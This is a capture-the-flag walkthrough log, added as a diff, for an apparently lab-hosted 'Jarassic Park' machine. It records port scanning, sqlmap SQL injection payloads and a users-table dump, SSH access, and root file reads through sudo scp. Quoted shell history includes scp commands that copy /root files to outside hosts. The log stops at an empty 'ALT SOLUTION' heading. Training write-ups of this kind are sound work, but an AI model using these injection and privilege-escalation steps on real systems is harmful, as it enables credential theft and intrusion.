@@ -1,0 +1,599 @@
+                                                                                                                                                                
+┌──(skyray㉿kali)-[~]
+└─$ nmap -sC -sV 10.130.176.234 -Pn
+Starting Nmap 7.99 ( https://nmap.org ) at 2026-11-23 07:27 -0500
+Nmap scan report for 10.130.176.234
+Host is up (0.026s latency).
+Not shown: 998 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 a2:a5:4f:8c:13:45:37:40:79:a7:80:38:5d:bc:da:0f (RSA)
+|   256 5b:e5:e6:53:ef:d6:fb:86:c7:11:c0:f6:e5:2e:bf:50 (ECDSA)
+|_  256 d5:78:d0:65:9e:2d:be:9d:34:b0:fe:52:ad:12:b2:d2 (ED25519)
+80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Jarassic Park
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 19.24 seconds
+
+
+┌──(skyray㉿kali)-[~]
+└─$ curl http://10.130.176.234/robots.txt                            
+Wubbalubbadubdub
+
+┌──(skyray㉿kali)-[~]
+└─$ gobuster dir -u http://10.130.176.234 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php, txt
+===============================================================
+Gobuster v3.8.2
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.130.176.234
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.8.2
+[+] Extensions:              php,
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+index.php            (Status: 200) [Size: 1274]
+shop.php             (Status: 200) [Size: 2642]
+assets               (Status: 301) [Size: 317] [--> http://10.130.176.234/assets/]
+item.php             (Status: 200) [Size: 208]
+delete               (Status: 200) [Size: 65]
+robots.txt			 (Status: 200) [Size: 78]
+
+--------------------------------------
+
+go to shop: http://10.130.176.234/shop.php?id=2 then test http://10.130.176.234/shop.php?id=0 and http://10.130.176.234/shop.php?id=-1
+
+ hint received about sqlmap....
+
+-----------------------------------
+
+
+┌──(skyray㉿kali)-[~]
+└─$ sqlmap -u http://10.130.176.234/item.php?id=2 --current-db
+        ___
+       __H__                                                                                                                                                    
+ ___ ___[']_____ ___ ___  {1.10.9#stable}                                                                                                                       
+|_ -| . ["]     | .'| . |                                                                                                                                       
+|___|_  [)]_|_|_|__,|  _|                                                                                                                                       
+      |_|V...       |_|   https://sqlmap.org                                                                                                                    
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 08:50:58 /2026-11-23/
+
+[08:50:58] [INFO] testing connection to the target URL
+[08:50:58] [INFO] checking if the target is protected by some kind of WAF/IPS
+[08:50:58] [INFO] testing if the target URL content is stable
+[08:50:58] [INFO] target URL content is stable
+[08:50:58] [INFO] testing if GET parameter 'id' is dynamic
+[08:50:58] [INFO] GET parameter 'id' appears to be dynamic
+[08:50:58] [INFO] heuristic (basic) test shows that GET parameter 'id' might be SQL injectable (possible DBMS: 'MySQL')
+[08:50:58] [INFO] testing for SQL injection on GET parameter 'id'
+it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
+for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y
+[08:51:03] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[08:51:03] [WARNING] reflective value(s) found and filtering out
+[08:51:03] [INFO] GET parameter 'id' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable (with --string="11")
+[08:51:03] [INFO] testing 'Generic inline queries'
+[08:51:03] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
+[08:51:03] [INFO] GET parameter 'id' is 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)' injectable 
+[08:51:03] [INFO] testing 'MySQL inline queries'
+[08:51:03] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
+[08:51:03] [WARNING] time-based comparison requires larger statistical model, please wait................... (done)                                            
+[08:51:04] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
+[08:51:04] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
+[08:51:04] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
+[08:51:04] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK - comment)'
+[08:51:04] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK)'
+[08:51:04] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
+[08:51:14] [INFO] GET parameter 'id' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
+[08:51:14] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
+[08:51:14] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
+[08:51:15] [INFO] testing 'MySQL UNION query (NULL) - 1 to 20 columns'
+[08:51:15] [INFO] target URL appears to be UNION injectable with 17 columns
+injection not exploitable with NULL values. Do you want to try with a random integer value for option '--union-char'? [Y/n] Y
+[08:51:22] [WARNING] if UNION based SQL injection is not detected, please consider forcing the back-end DBMS (e.g. '--dbms=mysql') 
+[08:51:22] [INFO] testing 'MySQL UNION query (33) - 21 to 40 columns'
+[08:51:26] [INFO] testing 'MySQL UNION query (33) - 41 to 60 columns'
+[08:51:27] [INFO] testing 'MySQL UNION query (33) - 61 to 80 columns'
+[08:51:27] [INFO] testing 'MySQL UNION query (33) - 81 to 100 columns'
+GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
+sqlmap identified the following injection point(s) with a total of 777 HTTP(s) requests:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=2 AND 5432=5432
+
+    Type: error-based
+    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
+    Payload: id=2 AND GTID_SUBSET(CONCAT(0x7178627671,(SELECT (ELT(8307=8307,1))),0x71706b6271),8307)
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: id=2 AND (SELECT 2900 FROM (SELECT(!SLEEP(5)))gYkU)
+---
+[08:51:44] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu 16.10 or 16.04 (yakkety or xenial)
+web application technology: Apache 2.4.18
+back-end DBMS: MySQL >= 5.6
+[08:51:45] [INFO] fetching current database
+[08:51:45] [INFO] retrieved: '[REDACTED]'
+current database: '[REDACTED]'
+[08:51:45] [INFO] fetched data logged to text files under '/home/skyray/.local/share/sqlmap/output/10.130.176.234'
+
+[*] ending @ 08:51:45 /2026-11-23/
+
+                                                                                                                                                                
+┌──(skyray㉿kali)-[~]
+└─$ sqlmap -u http://10.130.176.234/item.php?id=2 -D [REDACTED] --tables
+        ___
+       __H__                                                                                                                                                    
+ ___ ___[']_____ ___ ___  {1.10.9#stable}                                                                                                                       
+|_ -| . [(]     | .'| . |                                                                                                                                       
+|___|_  [(]_|_|_|__,|  _|                                                                                                                                       
+      |_|V...       |_|   https://sqlmap.org                                                                                                                    
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 08:52:24 /2026-11-23/
+
+[08:52:24] [INFO] resuming back-end DBMS 'mysql' 
+[08:52:24] [INFO] testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=2 AND 5432=5432
+
+    Type: error-based
+    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
+    Payload: id=2 AND GTID_SUBSET(CONCAT(0x7178627671,(SELECT (ELT(8307=8307,1))),0x71706b6271),8307)
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: id=2 AND (SELECT 2900 FROM (SELECT(!SLEEP(5)))gYkU)
+---
+[08:52:24] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu 16.10 or 16.04 (xenial or yakkety)
+web application technology: Apache 2.4.18
+back-end DBMS: MySQL >= 5.6
+[08:52:24] [INFO] fetching tables for database: '[REDACTED]'
+[08:52:24] [WARNING] reflective value(s) found and filtering out
+[08:52:24] [INFO] retrieved: 'items'
+[08:52:24] [INFO] retrieved: 'users'
+Database: [REDACTED]
+[2 tables]
++-------+
+| items |
+| users |
++-------+
+
+[08:52:24] [INFO] fetched data logged to text files under '/home/skyray/.local/share/sqlmap/output/10.130.176.234'
+
+[*] ending @ 08:52:24 /2026-11-23/
+
+                                                                                                                                                                
+┌──(skyray㉿kali)-[~]
+└─$ sqlmap -u http://10.130.176.234/item.php?id=2 -D [REDACTED] -T users --columns
+        ___
+       __H__                                                                                                                                                    
+ ___ ___[(]_____ ___ ___  {1.10.9#stable}                                                                                                                       
+|_ -| . [,]     | .'| . |                                                                                                                                       
+|___|_  [)]_|_|_|__,|  _|                                                                                                                                       
+      |_|V...       |_|   https://sqlmap.org                                                                                                                    
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 08:52:52 /2026-11-23/
+
+[08:52:52] [INFO] resuming back-end DBMS 'mysql' 
+[08:52:52] [INFO] testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=2 AND 5432=5432
+
+    Type: error-based
+    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
+    Payload: id=2 AND GTID_SUBSET(CONCAT(0x7178627671,(SELECT (ELT(8307=8307,1))),0x71706b6271),8307)
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: id=2 AND (SELECT 2900 FROM (SELECT(!SLEEP(5)))gYkU)
+---
+[08:52:52] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu 16.10 or 16.04 (xenial or yakkety)
+web application technology: Apache 2.4.18
+back-end DBMS: MySQL >= 5.6
+[08:52:52] [INFO] fetching columns for table 'users' in database '[REDACTED]'
+[08:52:52] [WARNING] reflective value(s) found and filtering out
+[08:52:52] [INFO] retrieved: 'id'
+[08:52:52] [INFO] retrieved: 'int(11) unsigned'
+[08:52:52] [INFO] retrieved: 'username'
+[08:52:52] [INFO] retrieved: 'varchar(11)'
+[08:52:52] [INFO] retrieved: 'password'
+[08:52:52] [INFO] retrieved: 'varchar(11)'
+Database: [REDACTED]
+Table: users
+[3 columns]
++----------+------------------+
+| Column   | Type             |
++----------+------------------+
+| id       | int(11) unsigned |
+| password | varchar(11)      |
+| username | varchar(11)      |
++----------+------------------+
+
+[08:52:52] [INFO] fetched data logged to text files under '/home/skyray/.local/share/sqlmap/output/10.130.176.234'
+
+[*] ending @ 08:52:52 /2026-11-23/
+
+                                                                                                                                                                
+┌──(skyray㉿kali)-[~]
+└─$ sqlmap -u http://10.130.176.234/item.php?id=2 -D [REDACTED] -T users --dump   
+        ___
+       __H__                                                                                                                                                    
+ ___ ___["]_____ ___ ___  {1.10.9#stable}                                                                                                                       
+|_ -| . [(]     | .'| . |                                                                                                                                       
+|___|_  [,]_|_|_|__,|  _|                                                                                                                                       
+      |_|V...       |_|   https://sqlmap.org                                                                                                                    
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 08:53:42 /2026-11-23/
+
+[08:53:42] [INFO] resuming back-end DBMS 'mysql' 
+[08:53:42] [INFO] testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=2 AND 5432=5432
+
+    Type: error-based
+    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
+    Payload: id=2 AND GTID_SUBSET(CONCAT(0x7178627671,(SELECT (ELT(8307=8307,1))),0x71706b6271),8307)
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: id=2 AND (SELECT 2900 FROM (SELECT(!SLEEP(5)))gYkU)
+---
+[08:53:42] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu 16.04 or 16.10 (yakkety or xenial)
+web application technology: Apache 2.4.18
+back-end DBMS: MySQL >= 5.6
+[08:53:42] [INFO] fetching columns for table 'users' in database '[REDACTED]'
+[08:53:42] [INFO] resumed: 'id'
+[08:53:42] [INFO] resumed: 'int(11) unsigned'
+[08:53:42] [INFO] resumed: 'username'
+[08:53:42] [INFO] resumed: 'varchar(11)'
+[08:53:42] [INFO] resumed: 'password'
+[08:53:42] [INFO] resumed: 'varchar(11)'
+[08:53:42] [INFO] fetching entries for table 'users' in database '[REDACTED]'
+[08:53:42] [WARNING] reflective value(s) found and filtering out
+[08:53:42] [INFO] retrieved: '2'
+[08:53:42] [INFO] retrieved: '1'
+[08:53:42] [INFO] retrieved: '[REDACTED]'
+[08:53:42] [INFO] retrieved: '2'
+[08:53:42] [INFO] retrieved: '[REDACTED]'
+Database: [REDACTED]
+Table: users
+[2 entries]
++----+-----------+----------+
+| id | password  | username |
++----+-----------+----------+
+| 1  | [REDACTED] |          |
+| 2  | [REDACTED]  |          |
++----+-----------+----------+
+
+[08:53:42] [INFO] table 'park.users' dumped to CSV file '/home/skyray/.local/share/sqlmap/output/10.130.176.234/dump/park/users.csv'
+[08:53:42] [INFO] fetched data logged to text files under '/home/skyray/.local/share/sqlmap/output/10.130.176.234'
+
+[*] ending @ 08:53:42 /2026-11-23/
+
+----------------------
+
+"Oh, Dennis Nedry has helped us to secure the app too." is the hint in the storyboard
+let's try dennis ssh account
+---------------------
+
+┌──(skyray㉿kali)-[~]
+└─$ ssh dennis@10.130.176.234                                            
+The authenticity of host '10.130.176.234 (10.130.176.234)' can't be established.
+ED25519 key fingerprint is: SHA256:VID8GWK6/zQVmzdoga0AtjBWxepwmAh8YfJHVL/uufw
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.130.176.234' (ED25519) to the list of known hosts.
+** WARNING: connection is not using a post-quantum key exchange algorithm.
+** This session may be vulnerable to "store now, decrypt later" attacks.
+** The server may need to be upgraded. See https://openssh.com/pq.html
+dennis@10.130.176.234's password: 
+Permission denied, please try again.
+dennis@10.130.176.234's password: 
+Welcome to Ubuntu 16.04.5 LTS (GNU/Linux 4.4.0-1072-aws x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  Get cloud support with Ubuntu Advantage Cloud Guest:
+    http://www.ubuntu.com/business/services/cloud
+
+62 packages can be updated.
+45 updates are security updates.
+
+
+
+The programs included with the Ubuntu system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+applicable law.
+
+dennis@ip-10-130-176-234:~$ id
+uid=1001(dennis) gid=1001(dennis) groups=1001(dennis)
+dennis@ip-10-130-176-234:~$ sudo -l
+Matching Defaults entries for dennis on ip-10-130-176-234.eu-west-3.compute.internal:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User dennis may run the following commands on ip-10-130-176-234.eu-west-3.compute.internal:
+    (ALL) NOPASSWD: /usr/bin/scp
+
+dennis@ip-10-130-176-234:~$ uname -a
+Linux ip-10-130-176-234 4.4.0-1072-aws #82-Ubuntu SMP Fri Nov 2 15:00:21 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
+dennis@ip-10-130-176-234:~$ cat /etc/os-release 
+NAME="Ubuntu"
+VERSION="16.04.5 LTS (Xenial Xerus)"
+ID=ubuntu
+ID_LIKE=debian
+PRETTY_NAME="Ubuntu 16.04.5 LTS"
+VERSION_ID="16.04"
+HOME_URL="http://www.ubuntu.com/"
+SUPPORT_URL="http://help.ubuntu.com/"
+BUG_REPORT_URL="http://bugs.launchpad.net/ubuntu/"
+VERSION_CODENAME=xenial
+UBUNTU_CODENAME=xenial
+
+dennis@ip-10-130-176-234:~$ ls -lah
+total 44K
+drwxr-xr-x 3 dennis dennis 4.0K Nov 23 14:02 .
+drwxr-xr-x 5 root   root   4.0K Nov 23 11:00 ..
+-rw------- 1 dennis dennis 1001 Feb 16  2019 .bash_history
+-rw-r--r-- 1 dennis dennis  220 Feb 16  2019 .bash_logout
+-rw-r--r-- 1 dennis dennis 3.7K Feb 16  2019 .bashrc
+drwx------ 2 dennis dennis 4.0K Nov 23 14:02 .cache
+-rw-rw-r-- 1 dennis dennis   93 Feb 16  2019 flag1.txt
+-rw-r--r-- 1 dennis dennis  655 Feb 16  2019 .profile
+-rw-rw-r-- 1 dennis dennis   32 Feb 16  2019 test.sh
+-rw------- 1 dennis dennis 4.3K Feb 16  2019 .viminfo
+dennis@ip-10-130-176-234:~$ cat flag1.txt 
+Congrats on finding the first flag.. But what about the rest? :O
+
+[REDACTED]
+
+dennis@ip-10-130-176-234:~$ cat test.sh 
+#!/bin/bash
+cat /root/flag5.txt
+
+
+
+dennis@ip-10-130-176-234:~$ ./test.sh
+-bash: ./test.sh: Permission denied
+dennis@ip-10-130-176-234:~$ chmod +x test.sh
+dennis@ip-10-130-176-234:~$ ./test.sh
+cat: /root/flag5.txt: Permission denied
+
+dennis@ip-10-130-176-234:~$ ls -lah
+total 44K
+drwxr-xr-x 3 dennis dennis 4.0K Nov 23 14:02 .
+drwxr-xr-x 5 root   root   4.0K Nov 23 11:00 ..
+-rw------- 1 dennis dennis 1001 Feb 16  2019 .bash_history
+-rw-r--r-- 1 dennis dennis  220 Feb 16  2019 .bash_logout
+-rw-r--r-- 1 dennis dennis 3.7K Feb 16  2019 .bashrc
+drwx------ 2 dennis dennis 4.0K Nov 23 14:02 .cache
+-rw-rw-r-- 1 dennis dennis   93 Feb 16  2019 flag1.txt
+-rw-r--r-- 1 dennis dennis  655 Feb 16  2019 .profile
+-rwxrwxr-x 1 dennis dennis   32 Feb 16  2019 test.sh
+-rw------- 1 dennis dennis 4.3K Feb 16  2019 .viminfo
+
+
+dennis@ip-10-130-176-234:~$ cat .bash_history 
+Flag3:[REDACTED]
+sudo -l
+sudo scp
+scp
+sudo find
+ls
+vim test.sh
+ls
+cd ~
+ls
+vim test.sh
+ls
+ls -la
+sudo scp -S test.sh
+sudo scp /etc/password
+sudo scp /etc/password localhost@10.8.0.6@~/
+sudo scp /etc/passwd localhost@10.8.0.6@~/
+sudo scp /etc/passwd dennis@10.0.0.59@~/
+sudo scp /etc/passwd dennis@10.0.0.59:~/
+sudo scp /etc/passwd dennis@10.0.0.59:/home/dennis
+sudo scp /etc/passwd ben@10.8.0.6:/
+sudo scp /root/flag5.txt ben@10.8.0.6:/
+sudo scp /root/flag5.txt ben@10.8.0.6:~/
+sudo scp /root/flag5.txt ben@10.8.0.6:~/ -v
+sudo scp -v /root/flag5.txt ben@10.8.0.6:~/
+sudo scp -v /root/flag5.txt ben@localhost:~/
+sudo scp -v /root/flag5.txt dennis@localhost:~/
+sudo scp -v /root/flag5.txt dennis@10.0.0.59:~/
+sudo scp -v /root/flag5.txt ben@10.8.0.6:~/
+ping 10.8.0.6
+ping 10.8.0.7
+sudo scp /root/flag5.txt ben@10.8.0.6:~/
+sudo scp /root/flag5.txt ben@88.104.10.206:~/
+sudo scp -v /root/flag5.txt ben@88.104.10.206:~/
+sudo scp /root/flag5.txt ben@10.8.0.6:~/
+ls
+vim ~/.bash_history 
+
+dennis@ip-10-130-176-234:/home$ cd ssm-user
+dennis@ip-10-130-176-234:/home/ssm-user$ ls -lah
+total 20K
+drwxr-xr-x 2 ssm-user ssm-user 4.0K Nov 23 11:00 .
+drwxr-xr-x 5 root     root     4.0K Nov 23 11:00 ..
+-rw-r--r-- 1 ssm-user ssm-user  220 Aug 31  2015 .bash_logout
+-rw-r--r-- 1 ssm-user ssm-user 3.7K Aug 31  2015 .bashrc
+-rw-r--r-- 1 ssm-user ssm-user  655 May 16  2017 .profile
+dennis@ip-10-130-176-234:/home/ssm-user$ cd ..
+dennis@ip-10-130-176-234:/home$ cd ubuntu
+dennis@ip-10-130-176-234:/home/ubuntu$ ls -lah
+total 40K
+drwxr-xr-x 4 ubuntu ubuntu 4.0K Mar  6  2019 .
+drwxr-xr-x 5 root   root   4.0K Nov 23 11:00 ..
+-rw------- 1 ubuntu ubuntu 1.3K Mar  6  2019 .bash_history
+-rw-r--r-- 1 ubuntu ubuntu  220 Aug 31  2015 .bash_logout
+-rw-r--r-- 1 ubuntu ubuntu 3.7K Aug 31  2015 .bashrc
+drwx------ 2 ubuntu ubuntu 4.0K Feb 16  2019 .cache
+-rw------- 1 ubuntu ubuntu  520 Feb 16  2019 .mysql_history
+-rw-r--r-- 1 ubuntu ubuntu  655 May 16  2017 .profile
+drwx------ 2 ubuntu ubuntu 4.0K Feb 16  2019 .ssh
+-rw-r--r-- 1 ubuntu ubuntu    0 Feb 16  2019 .sudo_as_admin_successful
+-rw------- 1 root   root   3.2K Mar  6  2019 .viminfo
+dennis@ip-10-130-176-234:/home/ubuntu$ cat .bash_history 
+cat: .bash_history: Permission denied
+
+dennis@ip-10-130-176-234:~$ find / -type f -name "*flag*" 2>/dev/null
+/proc/sys/kernel/acpi_video_flags
+/proc/kpageflags
+/home/dennis/flag1.txt
+/sys/devices/pnp0/00:06/tty/ttyS0/flags
+/sys/devices/vif-0/net/eth0/flags
+/sys/devices/virtual/net/lo/flags
+/sys/devices/platform/serial8250/tty/ttyS1/flags
+/sys/devices/platform/serial8250/tty/ttyS2/flags
+/sys/devices/platform/serial8250/tty/ttyS3/flags
+/sys/module/scsi_mod/parameters/default_dev_flags
+/usr/share/man/man3/X509_VERIFY_PARAM_set_flags.3ssl.gz
+/usr/share/man/man3/SSL_CONF_CTX_set_flags.3ssl.gz
+/usr/share/man/man1/dpkg-buildflags.1.gz
+/usr/share/man/de/man1/dpkg-buildflags.1.gz
+/usr/share/man/sv/man1/dpkg-buildflags.1.gz
+/usr/share/man/fr/man1/dpkg-buildflags.1.gz
+/usr/share/dpkg/buildflags.mk
+/usr/include/linux/kernel-page-flags.h
+/usr/include/linux/tty_flags.h
+/usr/include/x86_64-linux-gnu/asm/processor-flags.h
+/usr/include/x86_64-linux-gnu/bits/waitflags.h
+/usr/bin/dpkg-buildflags
+/usr/src/linux-aws-headers-4.4.0-1072/include/linux/page-flags.h
+/usr/src/linux-aws-headers-4.4.0-1072/include/linux/kernel-page-flags.h
+/usr/src/linux-aws-headers-4.4.0-1072/include/linux/irqflags.h
+/usr/src/linux-aws-headers-4.4.0-1072/include/linux/pageblock-flags.h
+/usr/src/linux-aws-headers-4.4.0-1072/include/linux/page-flags-layout.h
+/usr/src/linux-aws-headers-4.4.0-1072/include/uapi/linux/kernel-page-flags.h
+/usr/src/linux-aws-headers-4.4.0-1072/include/uapi/linux/tty_flags.h
+/usr/src/linux-aws-headers-4.4.0-1072/include/asm-generic/irqflags.h
+/usr/src/linux-aws-headers-4.4.0-1072/include/trace/events/gfpflags.h
+/usr/src/linux-aws-headers-4.4.0-1072/arch/h8300/include/asm/irqflags.h
+/usr/src/linux-aws-headers-4.4.0-1072/arch/nios2/include/asm/irqflags.h
+/usr/src/linux-aws-headers-4.4.0-1072/arch/c6x/include/asm/irqflags.h
+/usr/src/linux-aws-headers-4.4.0-1072/arch/avr32/include/asm/irqflags.h
+/usr/src/linux-aws-headers-4.4.0-1072/arch/frv/include/asm/irqflags.h
+/usr/src/linux-aws-headers-4.4.0-1072/arch/arm/include/asm/irqflags.h
+/usr/src/linux-aws-headers-4.4.0-1072/arch/m32r/include/asm/irqflags.h
+/usr/src/linux-aws-headers-4.4.0-1072/arch/s390/include/asm/irqflags.h
+/usr/src/linux-aws-headers-4.4.0-1072/arch/powerpc/include/asm/irqflags.h
+/usr/src/linux-aws-headers-4.4.0-1072/arch/hexagon/include/asm/irqflags.h
+/usr/src/linux-aws-headers-4.4.0-1072/arch/arm64/include/asm/irqflags.h
+/usr/src/linux-aws-headers-4.4.0-1072/arch/alpha/include/asm/irqflags.h
+/usr/src/linux-aws-headers-4.4.0-1072/arch/unicore32/include/asm/irqflags.h
+/usr/src/linux-aws-headers-4.4.0-1072/arch/cris/include/arch-v32/arch/irqflags.h
+/usr/src/linux-aws-headers-4.4.0-1072/arch/cris/include/arch-v10/arch/irqflags.h
+/usr/src/linux-aws-headers-4.4.0-1072/arch/cris/include/asm/irqflags.h
+/usr/src/linux-aws-headers-4.4.0-1072/arch/arc/include/asm/irqflags-compact.h
+/usr/src/linux-aws-headers-4.4.0-1072/arch/arc/include/asm/irqflags-arcv2.h
+/usr/src/linux-aws-headers-4.4.0-1072/arch/arc/include/asm/irqflags.h
+/usr/src/linux-aws-headers-4.4.0-1072/arch/microblaze/include/asm/irqflags.h
+/usr/src/linux-aws-headers-4.4.0-1072/arch/m68k/include/asm/irqflags.h
+/usr/src/linux-aws-headers-4.4.0-1072/arch/xtensa/include/asm/irqflags.h
+/usr/src/linux-aws-headers-4.4.0-1072/arch/x86/include/uapi/asm/processor-flags.h
+/usr/src/linux-aws-headers-4.4.0-1072/arch/x86/include/asm/processor-flags.h
+/usr/src/linux-aws-headers-4.4.0-1072/arch/x86/include/asm/irqflags.h
+/usr/src/linux-aws-headers-4.4.0-1072/arch/x86/kernel/cpu/mkcapflags.sh
+/usr/src/linux-aws-headers-4.4.0-1072/arch/metag/include/asm/irqflags.h
+/usr/src/linux-aws-headers-4.4.0-1072/arch/mips/include/asm/irqflags.h
+/usr/src/linux-aws-headers-4.4.0-1072/arch/mn10300/include/asm/irqflags.h
+/usr/src/linux-aws-headers-4.4.0-1072/arch/openrisc/include/asm/irqflags.h
+/usr/src/linux-aws-headers-4.4.0-1072/arch/score/include/asm/irqflags.h
+/usr/src/linux-aws-headers-4.4.0-1072/arch/um/include/asm/irqflags.h
+/usr/src/linux-aws-headers-4.4.0-1072/arch/sh/include/asm/irqflags.h
+/usr/src/linux-aws-headers-4.4.0-1072/arch/ia64/include/asm/irqflags.h
+/usr/src/linux-aws-headers-4.4.0-1072/arch/tile/include/asm/irqflags.h
+/usr/src/linux-aws-headers-4.4.0-1072/arch/blackfin/include/asm/irqflags.h
+/usr/src/linux-aws-headers-4.4.0-1072/arch/sparc/include/asm/irqflags_32.h
+/usr/src/linux-aws-headers-4.4.0-1072/arch/sparc/include/asm/irqflags_64.h
+/usr/src/linux-aws-headers-4.4.0-1072/arch/sparc/include/asm/irqflags.h
+/usr/src/linux-aws-headers-4.4.0-1072/arch/parisc/include/asm/irqflags.h
+/usr/src/linux-aws-headers-4.4.0-1072/scripts/coccinelle/locks/flags.cocci
+/usr/src/linux-headers-4.4.0-1072-aws/include/config/zone/dma/flag.h
+/usr/lib/php/20151012/build/ax_check_compile_flag.m4
+/usr/lib/x86_64-linux-gnu/perl/5.22.1/bits/waitflags.ph
+/boot/grub/fonts/flagTwo.txt
+dennis@ip-10-130-176-234:~$ cat /boot/grub/fonts/flagTwo.txt
+[REDACTED]
+
+--------------------------
+sudo -l --> (ALL) NOPASSWD: /usr/bin/scp
+
+google research: scp can be used as cp (from localhost to localhost)
+------------------------
+
+dennis@ip-10-130-176-234:$ sudo scp /root/flag5.txt /home/dennis/
+dennis@ip-10-130-176-234:$ ls -lah /home/dennis/
+total 52K
+drwxr-xr-x 3 dennis dennis 4.0K Nov 23 14:30 .
+drwxr-xr-x 5 root   root   4.0K Nov 23 11:00 ..
+-rw------- 1 dennis dennis 1001 Feb 16  2019 .bash_history
+-rw-r--r-- 1 dennis dennis  220 Feb 16  2019 .bash_logout
+-rw-r--r-- 1 dennis dennis 3.7K Feb 16  2019 .bashrc
+drwx------ 2 dennis dennis 4.0K Nov 23 14:02 .cache
+-rw-rw-r-- 1 dennis dennis   93 Feb 16  2019 flag1.txt
+-rw-r--r-- 1 root   root     33 Nov 23 14:30 flag5.txt
+-rw-r--r-- 1 dennis dennis  655 Feb 16  2019 .profile
+-rwxrwxr-x 1 dennis dennis   23 Nov 23 14:22 shell
+-rwxrwxr-x 1 dennis dennis   32 Feb 16  2019 test.sh
+-rw------- 1 dennis dennis 4.3K Feb 16  2019 .viminfo
+dennis@ip-10-130-176-234:$ cat flag5.txt 
+[REDACTED]
+
+ALT SOLUTION (GTFOBins scp SUDO):
+
